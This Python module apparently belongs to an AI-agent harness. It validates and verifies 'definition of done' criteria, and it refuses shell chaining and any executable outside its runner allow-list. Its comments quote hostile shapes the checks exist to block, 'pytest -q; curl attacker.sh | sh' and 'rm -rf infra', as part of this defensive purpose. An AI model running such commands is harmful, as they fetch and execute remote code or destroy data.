"""Definitions of done: validation, mandatory bars, and verification.

A task is not done because an agent says so. It is done when each mandatory
criterion has been independently proven, with evidence recorded against it. This
module is what makes that claim enforceable:

* :func:`validate_criteria` rejects criteria that cannot be checked at all,
  including the ones that pass by running nothing.
* :func:`apply_quality_bars` adds the tests / negative-test / security /
  liveness / code-quality criteria policy requires, where the task admits them.
* :func:`verify_criterion` proves a single criterion, either by running the
  check here or by handing it to the host to run.
"""

from __future__ import annotations

import json
import re
import shlex
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path

from ..config import Policy
from ..ids import now_iso
from ..models import (
    CriterionStatus,
    DoDCriterion,
    ExecutionTask,
    Severity,
    VerifyMethod,
)

# Statements that assert a feeling rather than a fact. A criterion phrased this
# way cannot fail, which means it cannot verify anything either.
_VAGUE = re.compile(
    r"\b(works?\s+(well|correctly|properly|as\s+expected)|good|better|improved?|"
    r"clean|nice|robust|proper(ly)?|appropriate(ly)?|reasonable|adequate|"
    r"sufficient(ly)?|high[- ]quality|best\s+practice)\b",
    re.IGNORECASE,
)

_CODE_HINT = re.compile(
    r"\.(py|js|ts|tsx|jsx|go|rs|rb|java|kt|cs|c|cc|cpp|h|hpp|php|swift|scala|sh)\b"
    r"|\b(function|class|module|endpoint|api|handler|service|test|refactor|implement)\b",
    re.IGNORECASE,
)


# What it takes for a proposed criterion to already cover one of the mandatory
# bars, and so for that bar not to be added.
#
# Each alternative has to match a phrase that *is* the check, never one that
# merely names its subject: "the output format is JSON" is about the data the
# code emits, "the seed test data loads" is about a fixture, and "the security
# cameras record" is about a domain. None of them proves anything about
# formatting, about the suite, or about untrusted input, yet each of them
# removed a mandatory bar while the bar was matched on a bare word. Anchoring
# was only half the fix -- it stopped `auth` matching inside `author`, but
# `format`, `test` and `security` are whole words in their own right.
#
# Every pattern below matches a subset of what its bare word list matched, so
# the narrowing can only restore a bar that used to be suppressed; it can never
# suppress one that used to be added.
_COVERS_TESTS = re.compile(
    r"""
      \b(go|cargo|npm|yarn|pnpm|dotnet|mvn|gradle|make)\s+tests?\b
    | \bcoverage\b
    | \b(unit|integration|regression|smoke|e2e|end-to-end|automated|failing)[\s-]tests?\b
    | \btests?\s+(pass\w*|cover\w*|exercise\w*|exist\w*|fail\w*)\b
    | \b(test|spec)s?\s+(suite|case|cases|file|files)\b
    | \b(suite|specs?)\s+pass\w*\b
    """,
    re.VERBOSE,
)

_COVERS_SECURITY = re.compile(
    r"""
      \b(injection|authn|authz|authentic|authoris|authoriz|secret
        |validat|sanitis|sanitiz)\w*\b
    | \bsecurity\s+(review|audit|check|checks|scan\w*|weakness\w*|issues?|risks?
        |control|controls|implications?|boundary|hardening|posture|tests?)\b
    | \b(review|audit|assess|check|scan)\w*\s+for\s+security\b
    """,
    re.VERBOSE,
)

_COVERS_CODE_QUALITY = re.compile(
    r"""
      \blint\w*\b
    | \bformatt(ing|er|ers|ed)\b
    | \b(code|coding)\s+(style|quality)\b
    | \bstyle\s?guide\b
    | \bstyle\s+(convention|rule)s?\b
    | \bquality\s+(gate|bar|check|checks)\b
    """,
    re.VERBOSE,
)


# A task whose whole point is that something must *not* happen: a fence that
# must hold, a guard that must refuse. Both tasks that failed in a real run
# failed on a shape nobody had tested -- ``rm -rf infra`` against a scope fence,
# a ``PermissionError`` against a lock -- because every criterion they carried
# was satisfiable by the implementer's own happy-path tests. A guard is only
# proven by the case it exists to reject.
_GUARD_TASK = re.compile(
    r"""
      \b(fence|fences|fencing|sandbox\w*|confine\w*|quarantine\w*)\b
    | \b(allow|deny|block)[\s-]?lists?\b
    | \b(traversal|injection|escap(e|es|ing)|spoof\w*|forg(e|ed|ery)|tamper\w*)\b
    | \b(untrusted|hostile|malicious|attacker|adversar\w*)\b
    | \b(privilege|privileges|permission|permissions|authoris\w*|authoriz\w*)\b
    | \baccess\s+control\b
    | \b(lock|locks|locking|mutex|semaphore|latch)\b
    | \b(retry|retries|retrying|backoff|throttl\w*|rate[\s-]limit\w*|quota|quotas)\b
    | \b(timeout|timeouts|deadline|deadlines)\b
    | \bresource\s+(guard|guards|limit|limits|exhaustion|leak|leaks)\b
    | \bout[\s-]of[\s-]scope\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

# What makes a criterion a *negative* test: it names an outcome the change must
# refuse, and it names the shape concretely enough to write down. "Rejects
# unsafe input" is neither; "raises PermissionError when the lock file is
# read-only" is both.
_REFUSAL = re.compile(
    r"""
      \b(reject\w*|refus\w*|den(y|ies|ied)|block\w*|forbid\w*|abort\w*)\b
    | \b(raises?|raised|throws?|thrown)\b
    | \bfails?\s+closed\b
    | \b(must|does|do|can|cannot|will)\s+not\b
    | \bnon-?zero\s+exit\b
    | \bexits?\s+[1-9]\d*\b
    | \bleaves?\s+\w+\s+untouched\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

_CONCRETE_SHAPE = re.compile(
    r"""
      '[^']+'                     # a quoted literal: the input, path or command
    | "[^"]+"
    | `[^`]+`
    | \b\w+(Error|Exception)\b    # a named exception
    | \b[45]\d\d\b                # an HTTP status
    | \.\./                       # a traversal shape
    | \b\w[\w.-]*/[\w./*-]+       # a path or glob
    | \brm\s+-[a-zA-Z]+\b         # a destructive command written out
    | \bE[A-Z]{3,}\b              # an errno name
    | \bSIG[A-Z]+\b               # a signal
    """,
    re.VERBOSE,
)

# Changes whose failure mode is not a wrong answer but no answer at all. The
# standing security bar asks whether a change is safe, never whether it
# terminates: a fix that replaced a crash with an unbounded hot spin satisfied
# every criterion it carried.
_LIVENESS_TASK = re.compile(
    r"""
      \b(lock|locks|locking|unlock\w*|mutex|semaphore|latch|barrier)\b
    | \b(deadlock\w*|livelock\w*|starvation|contention|contended)\b
    | \b(retry|retries|retrying|backoff|poll|polls|polling|spin\w*)\b
    | \b(timeout|timeouts|deadline|deadlines|wait|waits|waiting|blocking)\b
    | \b(thread|threads|threading|concurren\w*|parallelis\w*|race\s+condition)\b
    | \b(async|await|asyncio|coroutine\w*|event\s+loop)\b
    | \b(subprocess|socket|sockets|connection|connections|stream|streaming)\b
    | \bI/O\b
    | \b(queue|queues|backpressure)\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

_COVERS_LIVENESS = re.compile(
    r"""
      \b(hang|hangs|hanging|deadlock\w*|livelock\w*|spin\w*|busy[\s-]wait\w*)\b
    | \bwithout\s+bound\b
    | \bbounded[\s-]time\b
    | \b(terminates?|completes?|returns?|finishes?)\s+(with)?in\s+\d
    | \bwithin\s+\d+\s*(ms|secs?|seconds?|minutes?)\b
    | \bwall[\s-]clock\b
    """,
    re.VERBOSE | re.IGNORECASE,
)


# Flags that run a *subset* of a suite. A filter that selects nothing is not an
# error to most runners: ``go test -run ZzzNone ./...`` exits 0 with "[no tests
# to run]", cargo and vitest do the same, and pytest exits 5 only when every
# test in the run was deselected -- ``pytest -k "locking or modif"`` exits 0
# with the ``modif`` half matching nothing at all. In a real run a criterion
# filtered on ``-k modif`` was selecting zero tests the day it was written, and
# only a verifier that counted the selection noticed.
_SELECTION_FLAGS = frozenset({
    "-k", "-m", "-run", "--run", "-t", "--testNamePattern", "--test-name-pattern",
    "--filter", "--gtest_filter", "--grep", "--example",
})

# Short selection flags whose value may be attached (``-kmodif``).
_ATTACHABLE_FLAGS = ("-k", "-m", "-t")

# A pytest/unittest node id, and an anchored name pattern: the two ways a
# command can say exactly which tests it means instead of describing them.
_NODE_ID = re.compile(r"[\w./\-]+\.\w+::[\w\[\].-]+")
_ANCHORED_NAME = re.compile(r"\^[A-Za-z_]\w*\$")

# An expectation that pins how many tests ran, e.g. "7 passed" or "3 selected".
# Read as a minimum: the substring match that proves it also matches a larger
# count, which errs towards accepting a suite that has since grown.
_SELECTION_COUNT = re.compile(
    r"\b\d+\s*(?:tests?\s+)?(?:passed|selected|ran\b|ok\b)", re.IGNORECASE
)

# Operators that make a filter expression select for more than one reason, so a
# count cannot say which half of it matched.
_FILTER_BOOLEAN = re.compile(r"\b(or|and)\b", re.IGNORECASE)

# What a runner prints when its filter matched nothing.
_RAN_NOTHING = re.compile(
    r"""
      no\s+tests?\s+(to\s+run|ran|were\s+run|found|matched)
    | collected\s+0\s+items
    | running\s+0\s+tests
    | \b0\s+(?:tests?\s+)?(?:passed|selected|ok)\b
    | tests?:\s+0\s+total
    """,
    re.VERBOSE | re.IGNORECASE,
)


# Executables a criterion's command may name. A definition of done proves
# something by running the project's own checks, so this list is deliberately
# small: the command string is copied verbatim out of a model's JSON by
# ``parse_dod``, which makes it untrusted input, and anything outside the list
# is a request to run arbitrary code with the harness's own permissions.
#
# It is an allow-list of runners, not a proof of containment: several entries
# run whatever the project hands them (``npm test``, ``make``), and ``python``
# and ``node`` will run source given on the command line. ``tools.py`` reuses
# this list to fence a scoped agent's shell and refuses those inline-source
# flags on top; a criterion command is not scoped at all, and is bounded only by
# the user approving the task it belongs to.
VERIFY_EXECUTABLES = frozenset({
    "python", "python3", "py", "pytest", "tox", "coverage", "mypy", "ruff",
    "flake8", "pylint", "black", "isort", "bandit",
    "npm", "npx", "pnpm", "yarn", "node", "jest", "vitest", "eslint", "tsc",
    "go", "cargo", "rustc", "dotnet", "mvn", "gradle", "make", "cmake", "ctest",
    "rake", "rspec", "bundle", "phpunit", "swift",
})

# Characters that hand the rest of a command to a shell. They only matter
# unquoted: ``python -c "print(1); raise SystemExit(1)"`` is a single argument,
# while ``pytest -q; curl attacker.sh | sh`` is three commands.
_METACHARACTERS = ";&|<>`$\n\r"


@dataclass
class CriterionIssue:
    criterion_id: str
    problem: str
    severity: Severity = Severity.MEDIUM


# --------------------------------------------------------------------------
# Validation
# --------------------------------------------------------------------------


def _statement_key(statement: str) -> str:
    """A criterion's statement, normalised for comparison."""
    return " ".join(statement.lower().split())


def selection_filter(command: str) -> str | None:
    """The test-selection filter this command applies, or ``None``.

    Returned as ``flag value``, so a caller can quote it back to whoever wrote
    it. ``python -m pytest`` is not a filter: that ``-m`` names the module to
    run, and reading it as a marker expression would flag every criterion that
    invokes pytest the portable way.
    """
    tokens = shell_split(command)
    if not tokens:
        return None

    start = 1
    if executable_name(tokens[0]) in {"python", "python3", "py"}:
        for index in range(1, len(tokens)):
            if tokens[index] == "-m":
                start = index + 2
                break
            if not tokens[index].startswith("-"):
                break

    for index in range(start, len(tokens)):
        flag, separator, attached = tokens[index].partition("=")
        if flag in _SELECTION_FLAGS:
            value = attached if separator else (
                tokens[index + 1] if index + 1 < len(tokens) else ""
            )
            return f"{flag} {value}".strip()
        if len(flag) > 2 and not flag.startswith("--") and flag[:2] in _ATTACHABLE_FLAGS:
            return f"{flag[:2]} {flag[2:]}"
    return None


def unpinned_selection(criterion: DoDCriterion) -> str | None:
    """Why this criterion can pass having run nothing, or ``None`` if it cannot.

    A filter describes the tests a criterion means, and a description goes
    stale: rename the test, or write the filter against a test that never
    existed, and the command still exits 0 -- the criterion now certifies the
    absence of the tests it was written to demand. Naming node ids, or stating
    how many tests must be selected, turns that description back into an
    assertion.
    """
    selection = selection_filter(criterion.command)
    if selection is None:
        return None
    if _NODE_ID.search(criterion.command) or _ANCHORED_NAME.search(criterion.command):
        return None

    expression = selection.partition(" ")[2]
    if _FILTER_BOOLEAN.search(expression):
        return (
            f"the selection {selection!r} can match for more than one reason, so a "
            "count cannot say which half of it matched and a dead term stays "
            "invisible; name the test node ids this criterion means, as "
            "path/to/test_file.py::test_name"
        )
    if _SELECTION_COUNT.search(criterion.expect):
        return None
    return (
        f"the command runs a subset chosen by {selection!r}, and nothing says what "
        "that subset is: a filter that matches no test at all still passes. Name "
        "the test node ids, as path/to/test_file.py::test_name, or set expect to "
        "the minimum selection, as '7 passed'"
    )


def has_negative_test(task: ExecutionTask) -> bool:
    """Whether some criterion already drives a concrete refusal.

    Both halves have to be in the same criterion. A definition of done that
    says "rejects unsafe input" in one place and quotes a path in another has
    still not said what to write.
    """
    for criterion in task.dod:
        text = (
            f"{criterion.statement} {criterion.command} "
            f"{criterion.expect} {criterion.rubric}"
        )
        if _REFUSAL.search(text) and _CONCRETE_SHAPE.search(text):
            return True
    return False


def _shape_hint(task: ExecutionTask) -> str:
    """The task's own words for the failure it exists to prevent."""
    source = task.motivation.strip() or task.action.strip() or task.title.strip()
    return " ".join(source.split())[:240]


def validate_criteria(criteria: list[DoDCriterion], policy: Policy) -> list[CriterionIssue]:
    """Report everything that makes this definition of done unenforceable."""
    issues: list[CriterionIssue] = []
    mandatory = [c for c in criteria if c.mandatory]

    if len(criteria) < policy.min_dod_criteria:
        issues.append(
            CriterionIssue(
                "-",
                f"only {len(criteria)} criteria; policy requires at least "
                f"{policy.min_dod_criteria}",
                Severity.HIGH,
            )
        )
    if not mandatory:
        issues.append(CriterionIssue("-", "no mandatory criteria: nothing can fail", Severity.HIGH))
    if mandatory and not any(c.machine_checkable for c in mandatory):
        issues.append(
            CriterionIssue(
                "-",
                "every mandatory criterion is a subjective review; at least one must be "
                "checkable by command, test or inspection",
                Severity.HIGH,
            )
        )

    for crit in criteria:
        statement = crit.statement.strip()
        if not statement:
            issues.append(CriterionIssue(crit.id, "empty statement", Severity.HIGH))
            continue
        if _VAGUE.search(statement) and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    f"unfalsifiable wording ({statement[:60]!r}); state the observable outcome",
                    Severity.MEDIUM,
                )
            )
        if " and " in statement.lower() and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    "compound statement: split it so each half can pass or fail alone",
                    Severity.LOW,
                )
            )
        if crit.method in (VerifyMethod.COMMAND, VerifyMethod.TEST):
            if not crit.command.strip():
                issues.append(
                    CriterionIssue(crit.id, f"method={crit.method.value} but no command given",
                                   Severity.HIGH)
                )
            else:
                unpinned = unpinned_selection(crit)
                if unpinned is not None:
                    issues.append(CriterionIssue(crit.id, unpinned, Severity.HIGH))
        if crit.method is VerifyMethod.REVIEW and not crit.rubric.strip():
            issues.append(
                CriterionIssue(crit.id, "review criterion has no rubric to judge against",
                               Severity.MEDIUM)
            )
        if crit.method is VerifyMethod.INSPECTION and not crit.expect.strip():
            issues.append(
                CriterionIssue(crit.id, "inspection criterion does not say what proves it",
                               Severity.MEDIUM)
            )
    return issues


def touches_code(task: ExecutionTask) -> bool:
    """Whether the quality bars meaningfully apply to this task."""
    haystack = " ".join([task.title, task.action, *task.scope.paths])
    return bool(_CODE_HINT.search(haystack))


def detect_test_command(workspace: Path) -> str:
    """Best guess at how this project runs its tests.

    A test criterion with no command cannot be proven mechanically, so it decays
    into a model's opinion about whether tests pass -- which is exactly the kind
    of unverified assurance the harness exists to prevent. Guessing the runner
    from the project's own files keeps the criterion checkable.
    """
    if not workspace.is_dir():
        return ""

    if (workspace / "pyproject.toml").is_file() or (workspace / "pytest.ini").is_file():
        return "pytest -q"
    if any(workspace.rglob("test_*.py")) or (workspace / "tests").is_dir():
        return "pytest -q"

    package = workspace / "package.json"
    if package.is_file():
        try:
            scripts = json.loads(package.read_text(encoding="utf-8")).get("scripts", {})
        except (json.JSONDecodeError, OSError):
            scripts = {}
        if "test" in scripts:
            return "npm test --silent"
    if (workspace / "go.mod").is_file():
        return "go test ./..."
    if (workspace / "Cargo.toml").is_file():
        return "cargo test"
    return ""


def apply_quality_bars(
    task: ExecutionTask, policy: Policy, workspace: Path | None = None
) -> list[DoDCriterion]:
    """Add the mandatory bars policy requires, where the task admits them.

    Returns only the criteria that were added, so the caller can tell the user
    what the harness inserted on their behalf.
    """
    if not touches_code(task):
        return []

    existing = " ".join(c.statement.lower() + " " + c.command.lower() for c in task.dod)
    subject = f"{task.title} {task.action} {task.motivation}"
    present = {_statement_key(c.statement) for c in task.dod}
    added: list[DoDCriterion] = []

    def bar(covered: bool, criterion: DoDCriterion) -> None:
        """Add a mandatory bar unless it is covered, or already on the task.

        A bar is skipped only when the proposed criteria already cover it, which
        takes a phrase that means the check itself -- see the _COVERS_ patterns
        above. A bar a criterion can suppress by naming the task's subject
        matter is not a mandatory bar at all.

        The second test is against the harness's own wording rather than the
        model's: ``_apply_modifications`` re-runs this gate over a replaced
        definition of done, so a bar the replacement kept verbatim must not be
        added beside itself.
        """
        if covered or _statement_key(criterion.statement) in present:
            return
        present.add(_statement_key(criterion.statement))
        added.append(criterion)

    if policy.require_tests:
        bar(
            bool(_COVERS_TESTS.search(existing)),
            DoDCriterion(
                statement=(
                    "Automated tests cover the behaviour changed by this task, including "
                    "at least one failure or edge case, and the suite passes"
                ),
                method=VerifyMethod.TEST,
                command=detect_test_command(workspace) if workspace else "",
                expect="0",
                mandatory=True,
            ),
        )

    # A guard is proven by the case it rejects, and by nothing else. Both tasks
    # that failed in a real run met every criterion they carried and then fell
    # over on the first shape nobody had written down.
    if policy.require_negative_test and _GUARD_TASK.search(subject):
        bar(
            has_negative_test(task),
            DoDCriterion(
                statement=(
                    "A test drives the concrete failure shape this task exists to "
                    "prevent, and asserts the change refuses it"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Name the test and quote the input it drives. Pass only if that "
                    "input is the attack or failure shape this task was motivated by "
                    f"-- {_shape_hint(task)} -- written out concretely: the traversal "
                    "path, the destructive command, the exception the caller must see. "
                    "A test that exercises only the permitted path, or that asserts on "
                    "a log line rather than on the refusal, does not pass this "
                    "criterion."
                ),
                mandatory=True,
            ),
        )

    if policy.require_security_review:
        bar(
            bool(_COVERS_SECURITY.search(existing)),
            DoDCriterion(
                statement=(
                    "The change introduces no new untrusted-input, secret-handling or "
                    "authorisation weakness"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Trace each new or modified input path to its use. Pass only if "
                    "untrusted input is validated before use, secrets are neither logged "
                    "nor returned, and authorisation checks fail closed."
                ),
                mandatory=True,
            ),
        )

    # Safety is not liveness. A change that cannot be tricked can still stop
    # answering: the crash this kind of task is usually written to fix was once
    # replaced by an unbounded hot spin, which every criterion on it accepted.
    if policy.require_liveness_review and _LIVENESS_TASK.search(subject):
        bar(
            bool(_COVERS_LIVENESS.search(existing)),
            DoDCriterion(
                statement=(
                    "No wait, retry or lock this change adds can hang, deadlock or "
                    "spin without bound"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Follow every wait, retry and lock acquisition the change adds or "
                    "modifies. Pass only on a bounded-time demonstration: a named test "
                    "that drives the contended or failing path to completion inside a "
                    "stated wall-clock bound, with the measured time quoted. Reading "
                    "the code is not a demonstration. Fail if a retry loop has neither "
                    "a delay nor an attempt ceiling, if a lock is taken without a "
                    "timeout, or if a failure path returns to the same wait with "
                    "nothing changed."
                ),
                mandatory=True,
            ),
        )

    if policy.require_code_quality:
        bar(
            bool(_COVERS_CODE_QUALITY.search(existing)),
            DoDCriterion(
                statement=(
                    "The change follows the conventions of the files it touches and "
                    "introduces no duplicated logic that already exists in the codebase"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Compare against the surrounding code. Pass only if naming, structure "
                    "and error handling match local convention, and no copied block "
                    "duplicates an existing helper."
                ),
                mandatory=True,
            ),
        )

    task.dod.extend(added)
    task.updated_at = now_iso()
    return added


# --------------------------------------------------------------------------
# Verification
# --------------------------------------------------------------------------


@dataclass
class VerificationOutcome:
    status: CriterionStatus
    evidence: str
    verified_by: str = "harness"


def unquoted_metacharacter(command: str, characters: str = _METACHARACTERS) -> str | None:
    """The first of ``characters`` outside quotes, or ``None`` if there is none.

    Quoting is what separates ``python -c "a; b"`` -- one argument to one
    program -- from ``a; b``, which is two commands. A token scan cannot tell
    them apart after the fact, so the raw string is read here instead.

    ``characters`` defaults to the metacharacters that chain or redirect a
    command; :mod:`.tools` passes the glob characters instead, which are
    dangerous for a different reason but need the same quote-aware scan.
    """
    quote = ""
    for char in command:
        if quote:
            if char == quote:
                quote = ""
        elif char in "'\"":
            quote = char
        elif char in characters:
            return char
    return None


def executable_name(token: str) -> str:
    """The bare program name a command's first token invokes.

    ``/usr/bin/python3``, ``C:\\Python\\python.EXE`` and ``python`` are the same
    program, and an allow-list has to compare them as one.
    """
    return Path(token.replace("\\", "/")).name.lower().removesuffix(".exe")


def unsafe_command(command: str) -> str | None:
    """Why this command must not be run here, or ``None`` if it may be.

    Criterion commands arrive as model output (``parse_dod``) and are run with
    the harness's own permissions, so they are checked before use rather than
    trusted: no shell, and only the project's own check runners.
    """
    tokens = shell_split(command)
    if not tokens:
        return "the command is empty once tokenised"

    metacharacter = unquoted_metacharacter(command)
    if metacharacter is not None:
        return (
            f"it contains the unquoted shell metacharacter {metacharacter!r}, and "
            "criterion commands are run without a shell. Express each check as its "
            "own criterion instead of chaining or redirecting them"
        )

    executable = executable_name(tokens[0])
    if executable not in VERIFY_EXECUTABLES:
        return (
            f"{executable!r} is not one of the check runners a criterion may invoke "
            f"({', '.join(sorted(VERIFY_EXECUTABLES))}). Verify this by review, or by "
            "a command the user chooses to run themselves"
        )
    return None


def verify_command(
    criterion: DoDCriterion,
    workspace: Path,
    timeout: int = 300,
) -> VerificationOutcome:
    """Run a command criterion and judge it by exit code and expected output.

    Only reached when the caller has established that running commands here is
    permitted; see :func:`verify_criterion`. The command is tokenised and run
    without a shell, and refused outright unless :func:`unsafe_command` clears
    it -- a criterion the harness will not run is blocked, and blocked is not
    proven, so refusing here cannot certify anything.
    """
    command = criterion.command.strip()
    if not command:
        return VerificationOutcome(CriterionStatus.BLOCKED, "no command specified")

    refusal = unsafe_command(command)
    if refusal is not None:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"refused to run {command!r}: {refusal}"
        )

    # The allow-list clears a program name; running it needs a file. On Windows
    # npm, npx and yarn are ``.cmd`` shims, which CreateProcess cannot launch by
    # bare name -- so ``npm test --silent``, the command ``detect_test_command``
    # emits for a package.json project, came back BLOCKED there, and BLOCKED is
    # neither PASS nor WAIVED, so that criterion could never be closed. Looking
    # the name up on PATH honours PATHEXT and hands subprocess the shim itself.
    # This is the same search the process launcher would have done, narrowed to
    # nothing: an unresolvable name is refused here rather than in the OSError
    # below, so the evidence says the runner is missing.
    argv = shell_split(command)
    executable = shutil.which(argv[0])
    if executable is None:
        return VerificationOutcome(
            CriterionStatus.BLOCKED,
            f"refused to run {command!r}: {executable_name(argv[0])!r} is not on PATH",
        )
    argv[0] = executable

    try:
        completed = subprocess.run(  # noqa: S603 - tokenised, no shell, allow-listed
            argv,
            shell=False,
            cwd=str(workspace),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return VerificationOutcome(
            CriterionStatus.FAIL, f"command timed out after {timeout}s: {command}"
        )
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not run {command!r}: {exc}")

    output = (completed.stdout + completed.stderr).strip()
    tail = output[-1500:]
    evidence = f"$ {command}\nexit={completed.returncode}\n{tail}"

    expect = criterion.expect.strip()
    if not expect:
        ok = completed.returncode == 0
    else:
        # An expectation is either an exit code, or a substring that must appear
        # in the output *of a command that also succeeded*. Treating a substring
        # as sufficient on its own was a bug with real consequences: a test
        # command that printed "3 tests failed" and exited 1 satisfied an
        # expectation of "tests", so the check whose whole purpose is refusing
        # unproven work certified a failing suite.
        exit_match = re.fullmatch(r"(?:exit\s*(?:code)?\s*[= ]\s*)?(\d+)", expect, re.IGNORECASE)
        if exit_match:
            ok = completed.returncode == int(exit_match.group(1))
        else:
            ok = completed.returncode == 0 and expect.lower() in output.lower()
            if completed.returncode != 0 and expect.lower() in output.lower():
                evidence += (
                    f"\n\n[supervisor] the expected text {expect!r} appeared, but the "
                    f"command exited {completed.returncode}; a criterion is not met by "
                    "a command that failed. Express an expected failure as an exit code."
                )

    # A filter that selects nothing is not an error to most runners, so exit 0
    # here means either "everything passed" or "nothing ran", and only the
    # output tells them apart. ``unpinned_selection`` refuses this shape when
    # the criterion is written; this catches the filter that went stale after
    # it was approved, and the runner whose flag is not on that list.
    if ok and selection_filter(command) and _RAN_NOTHING.search(output):
        return VerificationOutcome(
            CriterionStatus.FAIL,
            evidence
            + "\n\n[supervisor] the command exited 0 but its filter selected no "
            "tests, so this criterion proved nothing. Name the test node ids it "
            "means, or correct the filter.",
        )

    return VerificationOutcome(
        CriterionStatus.PASS if ok else CriterionStatus.FAIL, evidence
    )


def verify_inspection(criterion: DoDCriterion, workspace: Path) -> VerificationOutcome:
    """Check a file-state expectation of the form ``path: substring``."""
    expect = criterion.expect.strip()
    if ":" not in expect:
        return VerificationOutcome(
            CriterionStatus.BLOCKED,
            "inspection expectation must read 'path/to/file: text that must be present'",
        )
    raw_path, _, needle = expect.partition(":")
    path = (workspace / raw_path.strip()).resolve()
    needle = needle.strip()

    try:
        path.relative_to(workspace.resolve())
    except ValueError:
        return VerificationOutcome(
            CriterionStatus.BLOCKED, f"path escapes the workspace: {raw_path.strip()}"
        )
    if not path.is_file():
        return VerificationOutcome(CriterionStatus.FAIL, f"{raw_path.strip()} does not exist")

    try:
        content = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return VerificationOutcome(CriterionStatus.BLOCKED, f"could not read {raw_path}: {exc}")

    if not needle:
        return VerificationOutcome(CriterionStatus.PASS, f"{raw_path.strip()} exists")

    if needle in content:
        line_no = content[: content.index(needle)].count("\n") + 1
        return VerificationOutcome(
            CriterionStatus.PASS, f"{raw_path.strip()}:{line_no} contains {needle!r}"
        )
    return VerificationOutcome(
        CriterionStatus.FAIL, f"{raw_path.strip()} does not contain {needle!r}"
    )


def verify_criterion(
    criterion: DoDCriterion,
    workspace: Path,
    policy: Policy,
    *,
    allow_commands: bool,
) -> VerificationOutcome | None:
    """Verify a criterion here, or return ``None`` to delegate it.

    ``None`` means the harness cannot or should not prove this one itself --
    review criteria always need a judge, and commands only run when explicitly
    permitted. Those go to the host or a verification agent instead.
    """
    if criterion.method is VerifyMethod.INSPECTION:
        return verify_inspection(criterion, workspace)

    if criterion.method in (VerifyMethod.COMMAND, VerifyMethod.TEST):
        if not allow_commands:
            return None
        return verify_command(criterion, workspace)

    return None


def summarise(task: ExecutionTask) -> str:
    """One-line status of a task's definition of done."""
    mandatory = task.mandatory_criteria
    passed = sum(1 for c in mandatory if c.status is CriterionStatus.PASS)
    waived = sum(1 for c in mandatory if c.status is CriterionStatus.WAIVED)
    failed = [c for c in mandatory if c.status is CriterionStatus.FAIL]
    parts = [f"{passed}/{len(mandatory)} mandatory criteria proven"]
    if waived:
        parts.append(f"{waived} waived")
    if failed:
        parts.append(f"{len(failed)} failing")
    return ", ".join(parts)


def shell_split(command: str) -> list[str]:
    """Best-effort tokenisation, used for display and for shell-free execution.

    A command that :func:`unsafe_command` has cleared contains no unquoted
    metacharacter, so this tokenisation is the whole of its meaning; the
    fallback exists only so a malformed command can still be shown.
    """
    try:
        return shlex.split(command)
    except ValueError:
        return command.split()
